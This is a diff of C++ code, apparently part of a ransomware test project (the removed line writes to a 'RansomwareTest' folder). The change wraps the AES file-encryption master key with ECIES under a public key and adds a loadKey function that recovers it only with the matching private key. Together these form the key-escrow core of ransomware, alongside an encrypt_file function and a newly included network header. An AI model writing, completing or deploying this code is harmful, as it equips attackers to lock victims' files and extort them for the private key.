@@ -2,6 +2,9 @@
 #include <cryptopp/files.h>
 #include <cryptopp/gcm.h>
 #include <cryptopp/aes.h>
+#include <cryptopp/eccrypto.h>
+
+#include "Network.h"
 
 AESKey generateKey(CryptoPP::AutoSeededRandomPool& rng)
 {
@@ -10,10 +13,32 @@ AESKey generateKey(CryptoPP::AutoSeededRandomPool& rng)
 	return key;
 }
 
-void save_key(AESKey& aes_key)
+void save_key(AESKey& aes_key, PublicKey& publicKey, CryptoPP::AutoSeededRandomPool& rng)
 {
-	std::ofstream filemasterkey("C:\\RansomwareTest\\filemaster.key");
-	filemasterkey.write(reinterpret_cast<const char*>(aes_key.data()), aes_key.size());
+	std::ofstream filemasterkey("filemaster.key", std::ios::binary);
+	CryptoPP::ECIES<CryptoPP::ECP>::Encryptor e(publicKey);
+
+	CryptoPP::ArraySource(aes_key.data(), aes_key.size(), true,
+		new CryptoPP::PK_EncryptorFilter(rng, e,
+			new CryptoPP::FileSink(filemasterkey)
+		)
+	);
+}
+
+AESKey loadKey(PrivateKey& privateKey, CryptoPP::AutoSeededRandomPool& rng)
+{
+	std::ifstream filemasterkey("filemaster.key", std::ios::binary);
+	CryptoPP::ECIES<CryptoPP::ECP>::Decryptor d(privateKey);
+
+	AESKey aes_key;
+
+	CryptoPP::FileSource(filemasterkey, true,
+		new CryptoPP::PK_DecryptorFilter(rng, d,
+			new CryptoPP::ArraySink(aes_key.data(), aes_key.size())
+		)
+	);
+
+	return aes_key;
 }
 
 void encrypt_file(const std::string& filename, std::array<byte, CryptoPP::AES::DEFAULT_KEYLENGTH>& aes_key, CryptoPP::AutoSeededRandomPool& rng)
